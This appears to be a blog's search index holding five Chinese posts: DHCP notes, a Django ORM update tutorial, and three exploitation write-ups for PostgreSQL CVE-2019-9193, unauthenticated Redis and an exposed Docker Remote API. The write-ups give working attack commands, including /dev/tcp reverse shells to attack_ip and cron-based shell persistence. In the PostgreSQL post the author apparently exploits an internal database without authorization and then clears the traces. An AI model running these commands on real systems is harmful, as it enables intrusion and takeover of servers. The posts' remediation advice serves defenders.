<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>《趣谈网络协议》学习总结：1-4讲</title>
    <link href="/2020/09/05/%E3%80%8A%E8%B6%A3%E8%B0%88%E7%BD%91%E7%BB%9C%E5%8D%8F%E8%AE%AE%E3%80%8B%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93%EF%BC%9A1-4%E8%AE%B2/"/>
    <url>/2020/09/05/%E3%80%8A%E8%B6%A3%E8%B0%88%E7%BD%91%E7%BB%9C%E5%8D%8F%E8%AE%AE%E3%80%8B%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93%EF%BC%9A1-4%E8%AE%B2/</url>
    
    <content type="html"><![CDATA[<p>##《趣谈网络协议》学习总结：1-4讲</p><h3 id="总结-思考："><a href="#总结-思考：" class="headerlink" title="总结/思考："></a>总结/思考：</h3><p>第四讲中关于DHCP的具体实现过程讲的比较抽象，于是上网google了一下具体的流程</p><h4 id="DHCP的实现"><a href="#DHCP的实现" class="headerlink" title="DHCP的实现"></a>DHCP的实现</h4><p>DHCP实现大致分为4步<br>第一步：Client端在局域网内发起一个DHCP　Discover包，目的是想发现能够给它提供IP的DHCP Server。<br>数据包内容：Client端使用IP地址0.0.0.0发送一个目的IP地址位255.255.255.255的广播包，使用的协议为UDP协议。</p><p>第二步：可用的DHCP Server接收到Discover包之后，通过发送DHCP Offer包给予Client端应答，意在告诉Client端它可以提供IP地址。<br>数据包内容：<br>（1）DHCP服务器仍然使用广播地址作为目的地址，因为此时请求分配IP的Client并没有自己ip,而可能有多个Client在使用0.0.0.0这个IP作为源IP向DHCP服务器发出IP分配请求，DHCP也不能使用0.0.0.0这个IP作为目的IP地址，于是依然采用广播的方式，告诉正在请求的Client们，这是一台可以使用的DHCP服务器。<br>（2）DHCP服务器提供了一个可用的IP,在数据包的Your (client) IP Address字段可以看到DHCP服务器提供的可用IP。<br>（3）除此之外，如图中红色矩形框的内容所示，服务器还发送了子网掩码，路由器，DNS，域名，IP地址租用期等信息。</p><p>第三步：Client端接收到Offer包之后，发送DHCP Request包请求分配IP。<br>数据包内容：当Client收到了DHCP Offer包以后（如果有多个可用的DHCP服务器，那么可能会收到多个DHCP Offer包），确认有可以和它交互的DHCP服务器存在，于是Client发送Request数据包，请求分配IP。<br>此时的源IP和目的IP依然是0.0.0.0和255.255.255.255。包中包含客户端的MAC地址、接受的租约中的IP地址、提供此租约的DHCP服务器地址等）。告诉所有DHCP服务器它将接受哪一台服务器（一般是最先到达的server）提供的IP地址，所有其他的DHCP服务器撤销它们的提供以便将IP地址提供给下一次IP租用请求。</p><p>第四步：DHCP Server发送ACK数据包，确认信息。<br>数据包内容：在数据包中包含以下信息，表示将这些资源信息分配给Client.<br>Your(client) IP address:分配给Client的可用IP。<br>后面有许多项option信息，前两项是DHCP服务器发送的消息类型（ACK）和服务器的身份标识，后面几项是：<br>Subnet Mask:Client端分配到的IP的子网掩码；<br>Router:路由器<br>Domain Name Server:DNS,域名服务器<br>Domain Name:域名<br>IP Address Lease Time:IP租用期。</p><p>后续：客户端在接收到DHCP ack广播后，会向网络发送三个针对此IP地址的ARP解析请求以执行冲突检测，查询网络上有没有其它机器使用该IP地址；如果发现该IP地址已经被使用，客户机会发出一个DHCP decline数据包给DHCP服务器，拒绝此IP地址租约，并重新发送DHCP discover信息。此时，在DHCP服务器管理控制台中，会显示此IP地址为BAD_ADDRESS。<br>如果网络上没有其它主机使用此IP地址，则客户机的TCP/IP使用租约中提供的IP地址完成初始化，从而可以和其他网络中的主机进行通讯。</p><h4 id="DHCP缺点："><a href="#DHCP缺点：" class="headerlink" title="DHCP缺点："></a>DHCP缺点：</h4><p>1.DHCP不能查出网络上非DHCP客户机已经在使用的IP地址，例如网络有一非DHCP客户机A已经手工分配了IP地址:100.53.46.5，但是DHCP服务器并不能识别出该地址已经被分配了，它向DHCP客户机配了一个重复的IP地址:100.53.46.5，这就导致了IP地址的冲突。当然，这些IP地址可以从被配置在DHCP服务器上的任何范围中排除。<br>2.当网络上存在两个DHCP服务器时，一个DHCP服务器不和另一个DHCP服务器通信，就不能查出已被其他服务器租出去的IP地址。因此，两个DHCP服务器不应该在它们各自的范围中使用相同的IP地址。此外，DHCP服务器不能跨路由器与客户机通信，除非路由器允许BOOTP转发，或者子网允许DHCP中转借。</p>]]></content>
    
    
    <categories>
      
      <category>网络</category>
      
      <category>DHCP</category>
      
    </categories>
    
    
    <tags>
      
      <tag>网络</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Django model篇（一）：update用法介绍</title>
    <link href="/2020/06/12/Django%20model%E7%AF%87%EF%BC%88%E4%B8%80%EF%BC%89%EF%BC%9Aupdate%E7%94%A8%E6%B3%95%E4%BB%8B%E7%BB%8D/"/>
    <url>/2020/06/12/Django%20model%E7%AF%87%EF%BC%88%E4%B8%80%EF%BC%89%EF%BC%9Aupdate%E7%94%A8%E6%B3%95%E4%BB%8B%E7%BB%8D/</url>
    
    <content type="html"><![CDATA[<h3 id="model-update常用方法"><a href="#model-update常用方法" class="headerlink" title="model update常用方法"></a>model update常用方法</h3><p>方法一：</p><pre><code class="hljs python">User.objects.filter(id=<span class="hljs-number">1</span>).update(username=<span class="hljs-string">'tachiulam'</span>,is_active=<span class="hljs-literal">True</span>)</code></pre><p>方法二：</p><pre><code class="hljs python">_t = User.objects.get(id=<span class="hljs-number">1</span>)_t.username=<span class="hljs-string">'tachiulam'</span>_t.is_active=<span class="hljs-literal">True</span>_t.save()</code></pre><p>方法一适合更新一批数据，类似于mysql语句update user set username=’tachiulam’ where id = 1</p><p>方法二适合更新一条数据，也只能更新一条数据，当只有一条数据更新时推荐使用此方法，另外此方法还有一个好处，我们接着往下看</p><h3 id="具有auto-now属性字段的更新"><a href="#具有auto-now属性字段的更新" class="headerlink" title="具有auto_now属性字段的更新"></a>具有auto_now属性字段的更新</h3><p>我们通常会给表添加三个默认字段</p><ul><li><p>自增ID，这个django已经默认加了，就像上边的建表语句，虽然只写了username和is_active两个字段，但表建好后也会有一个默认的自增id字段</p></li><li><p>创建时间，用来标识这条记录的创建时间，具有auto_now_add属性，创建记录时会自动填充当前时间到此字段</p></li><li><p>修改时间，用来标识这条记录最后一次的修改时间，具有auto_now属性，当记录发生变化时填充当前时间到此字段<br>就像下边这样的表结构</p></li></ul><pre><code class="hljs python"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">User</span><span class="hljs-params">(models.Model)</span>:</span>    create_time = models.DateTimeField(auto_now_add=<span class="hljs-literal">True</span>, verbose_name=<span class="hljs-string">'创建时间'</span>)    update_time = models.DateTimeField(auto_now=<span class="hljs-literal">True</span>, verbose_name=<span class="hljs-string">'更新时间'</span>)    username = models.CharField(max_length=<span class="hljs-number">255</span>, unique=<span class="hljs-literal">True</span>, verbose_name=<span class="hljs-string">'用户名'</span>)    is_active = models.BooleanField(default=<span class="hljs-literal">False</span>, verbose_name=<span class="hljs-string">'激活状态'</span>)</code></pre><p>当表有字段具有auto_now属性且你希望他能自动更新时，必须使用上边方法二的更新，不然auto_now字段不会更新，也就是：</p><pre><code class="hljs python">_t = User.objects.get(id=<span class="hljs-number">1</span>)_t.username=<span class="hljs-string">'tachiulam'</span>_t.is_active=<span class="hljs-literal">True</span>_t.save()</code></pre><h3 id="json-dict类型数据更新字段"><a href="#json-dict类型数据更新字段" class="headerlink" title="json/dict类型数据更新字段"></a>json/dict类型数据更新字段</h3><p>目前主流的web开放方式都讲究前后端分离，分离之后前后端交互的数据格式大都用通用的json型，那么如何用最少的代码方便的更新json格式数据到数据库呢？同样可以使用如下两种方法：</p><p>方法一：</p><pre><code class="hljs python">data = &#123;<span class="hljs-string">'username'</span>:<span class="hljs-string">'tachiulam'</span>,<span class="hljs-string">'is_active'</span>:<span class="hljs-string">'0'</span>&#125;User.objects.filter(id=<span class="hljs-number">1</span>).update(**data)</code></pre><ul><li><p>同样这种方法不能自动更新具有auto_now属性字段的值</p></li><li><p>通常我们再变量前加一个星号(*)表示这个变量是元组/列表，加两个星号表示这个参数是字典</p></li></ul><p>方法二：</p><pre><code class="hljs python">data = &#123;<span class="hljs-string">'username'</span>:<span class="hljs-string">'tachiulam'</span>,<span class="hljs-string">'is_active'</span>:<span class="hljs-string">'0'</span>&#125;_t = User.objects.get(id=<span class="hljs-number">1</span>)_t.__dict__.update(**data)_t.save()</code></pre><ul><li><p>方法二和方法一同样无法自动更新auto_now字段的值</p></li><li><p>注意这里使用到了一个dict方法</p></li></ul><p>方法三：</p><pre><code class="hljs python">_t = User.objects.get(id=<span class="hljs-number">1</span>)_t.role=Role.objects.get(id=<span class="hljs-number">3</span>)_t.save()</code></pre><h3 id="ForeignKey字段更新"><a href="#ForeignKey字段更新" class="headerlink" title="ForeignKey字段更新"></a>ForeignKey字段更新</h3><p>假如我们的表中有Foreignkey外键时，该如何更新呢？</p><pre><code class="hljs python"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">User</span><span class="hljs-params">(models.Model)</span>:</span>    create_time = models.DateTimeField(auto_now_add=<span class="hljs-literal">True</span>, verbose_name=<span class="hljs-string">'创建时间'</span>)    update_time = models.DateTimeField(auto_now=<span class="hljs-literal">True</span>, verbose_name=<span class="hljs-string">'更新时间'</span>)    username = models.CharField(max_length=<span class="hljs-number">255</span>, unique=<span class="hljs-literal">True</span>, verbose_name=<span class="hljs-string">'用户名'</span>)    is_active = models.BooleanField(default=<span class="hljs-literal">False</span>, verbose_name=<span class="hljs-string">'激活状态'</span>)    role = models.ForeignKey(Role, on_delete=models.CASCADE, null=<span class="hljs-literal">True</span>, verbose_name=<span class="hljs-string">'角色'</span>)</code></pre><p>方法一：</p><pre><code class="hljs python">User.objects.filter(id=<span class="hljs-number">1</span>).update(role=<span class="hljs-number">2</span>)</code></pre><ul><li><p>最简单的方法，直接让给role字段设置为一个id即可</p></li><li><p>当然也可以用dict作为参数更新：</p><pre><code class="hljs python">User.objects.filter(id=<span class="hljs-number">1</span>).update(**&#123;<span class="hljs-string">'username'</span>:<span class="hljs-string">'tachiulam'</span>,<span class="hljs-string">'role'</span>:<span class="hljs-number">3</span>&#125;)</code></pre></li></ul><p>方法二：</p><pre><code class="hljs python">_role = Role.objects.get(id=<span class="hljs-number">2</span>)User.objects.filter(id=<span class="hljs-number">1</span>).update(role=_role)</code></pre><ul><li><p>也可以赋值一个实例给role</p></li><li><p>当然也可以用dict作为参数更新：</p></li></ul><pre><code class="hljs python">_role = Role.objects.get(id=<span class="hljs-number">1</span>)User.objects.filter(id=<span class="hljs-number">1</span>).update(**&#123;<span class="hljs-string">'username'</span>:<span class="hljs-string">'tachiulam'</span>,<span class="hljs-string">'role'</span>:_role&#125;)</code></pre><p>方法三：</p><pre><code class="hljs python">_t = User.objects.get(id=<span class="hljs-number">1</span>)_t.role=Role.objects.get(id=<span class="hljs-number">3</span>)_t.save()</code></pre><ul><li><p>注意：这里的role必须赋值为一个对象，不能写id，不然会报错”User.role” must be a “Role” instance</p></li><li><p>当使用dict作为参数更新时又有一点不同，如下代码：</p></li></ul><pre><code class="hljs python">_t = User.objects.get(id=<span class="hljs-number">1</span>)_t.__dict__.update(**&#123;<span class="hljs-string">'username'</span>:<span class="hljs-string">'tachiulam'</span>,<span class="hljs-string">'role_id'</span>:<span class="hljs-number">2</span>&#125;)_t.save()</code></pre><ul><li><p>Foreignkey外键必须加上<code>_id</code>，例如：{‘role_id’:3}</p></li><li><p>role_id后边必须跟一个id（int或str类型都可），不能跟role实例</p></li></ul><h3 id="ManyToManyField字段更新"><a href="#ManyToManyField字段更新" class="headerlink" title="ManyToManyField字段更新"></a>ManyToManyField字段更新</h3><p>假如我们的表中有ManyToManyField字段时更新又有什么影响呢？</p><pre><code class="hljs python"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">User</span><span class="hljs-params">(models.Model)</span>:</span>    create_time = models.DateTimeField(auto_now_add=<span class="hljs-literal">True</span>, verbose_name=<span class="hljs-string">'创建时间'</span>)    update_time = models.DateTimeField(auto_now=<span class="hljs-literal">True</span>, verbose_name=<span class="hljs-string">'更新时间'</span>)    username = models.CharField(max_length=<span class="hljs-number">255</span>, unique=<span class="hljs-literal">True</span>, verbose_name=<span class="hljs-string">'用户名'</span>)    is_active = models.BooleanField(default=<span class="hljs-literal">False</span>, verbose_name=<span class="hljs-string">'激活状态'</span>)    role = models.ForeignKey(Role, on_delete=models.CASCADE, null=<span class="hljs-literal">True</span>, verbose_name=<span class="hljs-string">'角色'</span>)    groups = models.ManyToManyField(Group, null=<span class="hljs-literal">True</span>, verbose_name=<span class="hljs-string">'组'</span>)</code></pre><p>m2m更新：m2m字段没有直接更新的方法，只能通过清空再添加的方法更新了</p><pre><code class="hljs python">_t = User.objects.get(id=<span class="hljs-number">1</span>)_t.groups.clear()_t.groups.add(*[<span class="hljs-number">1</span>,<span class="hljs-number">3</span>,<span class="hljs-number">5</span>])_t.save()</code></pre><ul><li><p>add()：m2m字段添加一个值，当有多个值的时候可用列表，参照上边例子</p></li><li><p>_t.groups.add(2)</p></li><li><p>_t.groups.add(Group.objects.get(id=2))</p></li><li><p>remove()：m2m字段移除一个值，，当有多个值的时候可用列表，参照上边例子</p></li><li><p>_t.groups.remove(2)</p></li><li><p>_t.groups.remove(Group.objects.get(id=2))</p></li><li><p>clear()：清空m2m字段的值</p></li></ul><p><a href="https://mp.weixin.qq.com/s?__biz=MzU5MDY1MzcyOQ==&mid=2247483702&idx=1&sn=720529d0cd15ecf11e07392d5da33a47&scene=21#wechat_redirect" target="_blank" rel="noopener">🔗原文链接</a></p>]]></content>
    
    
    <categories>
      
      <category>Django</category>
      
      <category>model</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Django</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>PostgreSQL任意命令执行漏洞利用（CVE-2019-9193)</title>
    <link href="/2020/05/25/PostgreSQL%E4%BB%BB%E6%84%8F%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%EF%BC%88CVE-2019-9193/"/>
    <url>/2020/05/25/PostgreSQL%E4%BB%BB%E6%84%8F%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%EF%BC%88CVE-2019-9193/</url>
    
    <content type="html"><![CDATA[<p>最近没事曰曰内网，偶然发现了一个使用空密码的pg（是的，连爆破都省了）。用navicat连上去看了下几个库都是一些业务测试数据，没什么好收集；不死心，google了一下发现有个比较新的CVE好像可以操作一下~</p><h4 id="漏洞概述"><a href="#漏洞概述" class="headerlink" title="漏洞概述"></a>漏洞概述</h4><p>最近，安全研究人员披露了PostgreSQL实例代码执行漏洞（CVE-2019-9193）的漏洞细节。具有数据库 服务器 文件读取权限的攻击者可以利用此漏洞执行任意系统命令。</p><p>从9.3版本开始，Postgres新增了一个COPY TO/FROM PROGRAM功能，允许数据库的超级用户以及pg_read_server_files组中的任何用户执行操作系统命令。</p><p>**受影响的版本（貌似更新版本无解）</p><p>PostgreSQL&gt; = 9.3**</p><h4 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h4><h5 id="pg数据库连接"><a href="#pg数据库连接" class="headerlink" title="pg数据库连接"></a>pg数据库连接</h5><pre><code class="hljs plain"># 连接postgressql，虽然是内网ip但还是打一下码吧psql -U postgres -h 172.xx.xxx.xx</code></pre><p><img src="/img/pg_res1.png" srcset="/img/loading.gif" alt="image"></p><h5 id="开始攻击（直接套用网上POC）"><a href="#开始攻击（直接套用网上POC）" class="headerlink" title="开始攻击（直接套用网上POC）"></a>开始攻击（直接套用网上POC）</h5><pre><code class="hljs plain"># 删除并创建用于保存系统命令执行结果的表 DROP TABLE IF EXISTS cmd_exec;CREATE TABLE cmd_exec(cmd_output text);# 命令执行测试，多试几条COPY cmd_exec FROM PROGRAM &#39;id&#39;;COPY cmd_exec FROM PROGRAM &#39;whoami&#39;;# 查看结果SELECT * FROM cmd_exec;</code></pre><p><img src="/img/pg_res2.png" srcset="/img/loading.gif" alt="image"><br>我的🐎，还是个root用户，，都不用提权了（这安全意识阿。。。）</p><h5 id="Getshell"><a href="#Getshell" class="headerlink" title="Getshell"></a>Getshell</h5><p>虽然都可以执行系统命令了，拿不拿shell无所谓，但拿了还是要方便一些；</p><pre><code class="hljs plain"># attack机器上开启监听nc -lvnp 8888# 利用pg执行远程连接命令COPY cmd_exec FROM PROGRAM &#39;bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;attack_ip&#x2F;8888 0&gt;&amp;1&#39;;</code></pre><p>attack机器已经返回shell连接了~<br><img src="/img/pg_res3.png" srcset="/img/loading.gif" alt="image"></p><p>记录一下，顺便清除记录收工了。</p><h4 id="解决方案建议"><a href="#解决方案建议" class="headerlink" title="解决方案建议"></a>解决方案建议</h4><p>1、pg_read_server_files，pg_write_server_files和pg_execute_server_program角色涉及读取和写入具有大权限的数据库服务器文件。将此角色权限分配给数据库用户时，应慎重考虑。</p><p>2、使用强密码！！！</p><p>3、进行网络隔离，只允许需要的IP连接；</p><p><a href="https://zhuanlan.zhihu.com/p/143443516" target="_blank" rel="noopener">🔗知乎链接</a></p>]]></content>
    
    
    <categories>
      
      <category>渗透测试</category>
      
    </categories>
    
    
    <tags>
      
      <tag>安全</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Redis未授权访问漏洞利用</title>
    <link href="/2020/05/25/Redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/"/>
    <url>/2020/05/25/Redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/</url>
    
    <content type="html"><![CDATA[<h4 id="漏洞简介及危害"><a href="#漏洞简介及危害" class="headerlink" title="漏洞简介及危害"></a>漏洞简介及危害</h4><p>Redis 默认情况下，会绑定在 0.0.0.0:6379，如果没有进行采用相关的策略，比如添加防火墙规则避免其他非信任来源 ip 访问等，这样将会将 Redis 服务暴露到公网上，如果在没有设置密码认证（一般为空）的情况下，会导致任意用户在可以访问目标服务器的情况下未授权访问 Redis 以及读取 Redis 的数据。攻击者在未授权访问 Redis 的情况下，利用 Redis 自身的提供的config 命令，可以进行写文件操作，攻击者可以成功将自己的ssh公钥写入目标服务器的 /root/.ssh 文件夹的authotrized_keys 文件中，进而可以使用对应私钥直接使用ssh服务登录目标服务器、添加计划任务、写入Webshell等操作。</p><h4 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h4><h5 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h5><pre><code class="hljs plain"># redis安装wget http:&#x2F;&#x2F;download.redis.io&#x2F;releases&#x2F;redis-3.2.0.tar.gztar -xvzf redis-3.2.0.tar.gzcd redis-3.2.0make# 修改配置文件vim redis.conf# bind 127.0.0.1               前面加上#号    # protected-mode设为no protected-mode no# 保存退出# 启动redis-serverredis-server redis-conf</code></pre><p>观察到如下输出，漏洞环境搭建成功<br><img src="/img/redis_res1.png" srcset="/img/loading.gif" alt="image"></p><h5 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h5><pre><code class="hljs plain"># 在攻击主机上打开9999端口监听[root@]# nc -vv -l -p 9999</code></pre><h5 id="未授权访问验证"><a href="#未授权访问验证" class="headerlink" title="未授权访问验证"></a>未授权访问验证</h5><pre><code class="hljs plain"># 连接靶机redisredis -h target_ip# 获取redis版本等信息target_ip&gt; info</code></pre><p><img src="/img/redis_res2.png" srcset="/img/loading.gif" alt="image"></p><h5 id="写入shell"><a href="#写入shell" class="headerlink" title="写入shell"></a>写入shell</h5><pre><code class="hljs plain"># 设置变量target_ip:6379&gt; set xx &quot;\n* * * * * bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;attack_ip&#x2F;9999 0&gt;&amp;1\n&quot;OK# 修改redis默认目录和rdb文件target_ip:6379&gt; config set dir &#x2F;var&#x2F;spool&#x2F;cronOKtarget_ip:6379&gt; config set dbfilename rootOKtarget_ip:6379&gt; saveOK</code></pre><h5 id="成功反弹宿主机shell"><a href="#成功反弹宿主机shell" class="headerlink" title="成功反弹宿主机shell"></a>成功反弹宿主机shell</h5><p><img src="/img/redis_res3.png" srcset="/img/loading.gif" alt="image"></p><blockquote><p>P.S ，测试完记得关闭存在漏洞的redis</p></blockquote><h4 id="修复建议"><a href="#修复建议" class="headerlink" title="修复建议"></a>修复建议</h4><p>方法一： 可以修改绑定的IP、端口和指定访问者IP 具体根据实际情况来设定，也可以直接在服务器防火墙上做设置。</p><p>方法二： 设置访问密码 在 redis.conf 中找到“requirepass”字段，取消注释并在后面填上你需要的密码。 注：修改redis的配置需要重启redis才能生效。</p><p>7 <a href="https://zhuanlan.zhihu.com/p/142798377" target="_blank" rel="noopener">🔗知乎链接</a></p>]]></content>
    
    
    <categories>
      
      <category>渗透测试</category>
      
    </categories>
    
    
    <tags>
      
      <tag>安全</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Docker Remote API 未授权访问漏洞利用</title>
    <link href="/2020/05/23/Docker-Remote-API-%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/"/>
    <url>/2020/05/23/Docker-Remote-API-%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/</url>
    
    <content type="html"><![CDATA[<h4 id="漏洞简介及危害"><a href="#漏洞简介及危害" class="headerlink" title="漏洞简介及危害"></a>漏洞简介及危害</h4><p>Docker是一个开源的应用容器引擎，让开发者可以打包他们的应用以及依赖包到一个可移植的容器中，然后发布到任何流行的LINUX机器上，也可以实现虚拟化。 Docker swarm 是一个将docker集群变成单一虚拟的docker host工具，使用标准的Docker API，能够方便docker集群的管理和扩展，由docker官方提供。</p><p>Docker Remote API 是一个取代远程命令行界面（rcli）的REST API。Docker Remote API如配置不当可导致未授权访问，攻击者利用 docker client 或者 http 直接请求就可以访问这个 API，可能导致敏感信息泄露，黑客也可以删除Docker上的数据。 攻击者可进一步利用Docker自身特性，直接访问宿主机上的敏感信息，或对敏感文件进行修改，最终完全控制服务器。</p><h4 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h4><h5 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h5><pre><code class="hljs plain"># 靶机IP&#x2F;端口172.19.101.34 2375# 操作系统linux_x86</code></pre><h5 id="未授权访问测试"><a href="#未授权访问测试" class="headerlink" title="未授权访问测试"></a>未授权访问测试</h5><pre><code class="hljs plain">docker -H tcp:&#x2F;&#x2F;172.19.101.34:2375 images# 返回镜像信息，漏洞存在</code></pre><h5 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h5><pre><code class="hljs plain"># 在攻击主机上打开8088端口监听[root@]# nc -vv -l -p 8088</code></pre><h5 id="写入shell"><a href="#写入shell" class="headerlink" title="写入shell"></a>写入shell</h5><p>创建容器，利用bash和crontab计划任务向宿主机写入shell，centos系统挂载路径为。 /var/spool/cron/root；ubuntu系统为/var/spool/cron/crontabs/root；</p><pre><code class="hljs plain"># 查看宿主机可用镜像docker -H tcp:&#x2F;&#x2F;172.19.101.34:2375 images# 选择合适镜像创建容器docker -H tcp:&#x2F;&#x2F;172.19.101.34:2375 run -it -v &#x2F;var&#x2F;spool&#x2F;cron&#x2F;:&#x2F;var&#x2F;spool&#x2F;cron&#x2F; image_id &#x2F;bin&#x2F;bash# 启动刚刚创建的容器并连接docker -H tcp:&#x2F;&#x2F;172.19.101.34:2375 start ct_iddocker -H tcp:&#x2F;&#x2F;172.19.101.34:2375 exec -it --user root ct_id &#x2F;bin&#x2F;bash# 执行shell反弹命令root@bfd2539dfdc8:&#x2F;# echo &#39;* * * * * bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;attack_ip&#x2F;8088 0&gt;&amp;1&#39; &gt;&gt; &#x2F;var&#x2F;spool&#x2F;cron&#x2F;root</code></pre><h5 id="成功反弹宿主机shell"><a href="#成功反弹宿主机shell" class="headerlink" title="成功反弹宿主机shell"></a>成功反弹宿主机shell</h5><p><img src="/img/docker_res.png" srcset="/img/loading.gif" alt="image"></p><blockquote><p>P.S ，测试完记得删掉存在漏洞的容器</p></blockquote><h4 id="修复建议"><a href="#修复建议" class="headerlink" title="修复建议"></a>修复建议</h4><p>临时解决方案：</p><p>1、对2375端口做网络访问控制，如设置iptables策略仅允许指定的IP来访问Docker接口；</p><p>2、修改docker swarm的认证方式，使用TLS认证：Overview Swarm with TLS 和 Configure Docker Swarm for TLS这两篇文档，说的是配置好TLS后，Docker CLI 在发送命令到docker daemon之前，会首先发送它的证书，如果证书是由daemon信任的CA所签名的，才可以继续执行。</p><p><strong>总之、不要将端口直接暴露在公网，内网中使用需要设置严格的访问规则，并使用TLS。</strong></p><p><a href="https://zhuanlan.zhihu.com/p/142798377" target="_blank" rel="noopener">🔗知乎链接</a></p>]]></content>
    
    
    <categories>
      
      <category>渗透测试</category>
      
    </categories>
    
    
    <tags>
      
      <tag>安全</tag>
      
    </tags>
    
  </entry>
  
  
  
  
</search>
